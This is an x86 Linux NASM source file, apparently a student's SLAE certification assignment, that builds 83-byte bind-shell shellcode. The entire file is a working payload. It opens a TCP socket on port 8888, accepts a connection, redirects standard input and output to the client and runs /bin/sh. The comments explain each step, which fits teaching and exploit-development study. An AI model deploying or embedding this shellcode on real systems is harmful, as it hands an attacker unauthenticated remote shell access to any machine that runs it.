; Filename:   shell_bind_tcp.nasm
; Author:     Samuel Dugo
; SLAE-ID:    SLAE-1376
; Size:       83 bytes
; Purpose:    Assignment #1 of SLAE certification. This shellcode creates a bind tcp shell.

global _start			

section .text
_start:
	; Creating a TCP socket
	cdq			;doubles eax and stores result on eax & edx (0)
	; socket call requires socket(AF_INET,SOCK_STREAM,0)
	push edx		;sets socket.protocol = 0
	push 0x1
	pop ebx			;ebx now is 0x1 to declare SYS_SOCKET function on sys_socketcall
	push ebx		;sets socket.type = 1 = SOCK_STREAM
	push 2			;sets socket.domain = 2 = AF_INET
	; sys_socketcall requires ecx--> args (loaded on esp), ebx --> SYS_SOCKET, eax --> 0x66
	push 0x66		
	pop eax			;defines syscall as sys_socketcall(number,args)
	mov ecx,esp		;loads the arguments on ecx
	int 0x80

	; Binding the TCP socket
	inc ebx                 ;ebx now is 0x2 to declare SYS_BIND function on sys_socketcall
	    ;*addr section
	push edx                ;INADDR_ANY = 0
	mov si,0xb822           ;loads the variable port on SI register
	push esi                ;PORT in htons = 8888
	push bx                 ;AF_INET = 2
	mov ecx,esp             ;saves the pointer of addr on ecx
	    ;now, store "sockfd,*addr,addrlen on ecx
	push byte 16            ;loads 16 bytes for addrlen (IPv4 = 4bytes*4)
	push ecx                ;loads the memory location of addr struct
	push eax                ;loads the fd
	mov ecx, esp
	pop edi			;saves the fd
	mov al,0x66             ;defines syscall as sys_socketcall(number,args)
	int 0x80                ;executes the call

	; Starting listening for incoming connections
	inc ebx			;is more efficient two "inc" than "add ebx,2"
	inc ebx			;ebx now is 0x4 to declare SYS_LISTEN function on sys_socketcall
	push edx                ;this null push is for next function, does not harm this, but does a trick to optmize code :)
	push edx                ;backlog = 0
	push edi                ;loads the fd
	mov ecx,esp             ;loads the arguments on ecx
	mov al,0x66             ;defines syscall as sys_socketcall(number,args)
	int 0x80

	; Accepting an incoming connection
	inc ebx                 ;ebx now is 0x5 to declare SYS_ACCEPT function on sys_socketcall
	mov al,0x66             ;defines syscall as sys_socketcall(number,args)
	int 0x80

	; Redirecting STDIN, STDOUT and STDERR to a newly created socket from a client
	mov ebx,eax             ;saves the oldfd on ebx
	xor ecx,ecx		;zeroed ecx
	mov cl,0x03		;sets newfd to 3 for looping through stdout,stdin,stderr
Redirection:
	dec ecx			;decrements by 1 ecx to pass through stdout,stdin,stderr
        mov al,0x3f             ;syscall number for sys_dup2
        int 0x80                ;executes dup2(oldfd,$ecx) for redirect stdout,stdin,stderr
	jnz Redirection		;repeats this process until zero flag is set

	; Executing a shell
	push edx                ;loads NULL terminator
	push long 0x68732f2f    ;loads 'hs//'
	push long 0x6e69622f    ;loads 'nib/'
	mov ebx,esp             ;saves the pointer to '/bin//sh'
	;ecx & edx still contain NULL
	mov al,0x0b             ;configures eax for syscall - execve
	int 0x80                ;executes execve('//bin/sh',NULL,NULL)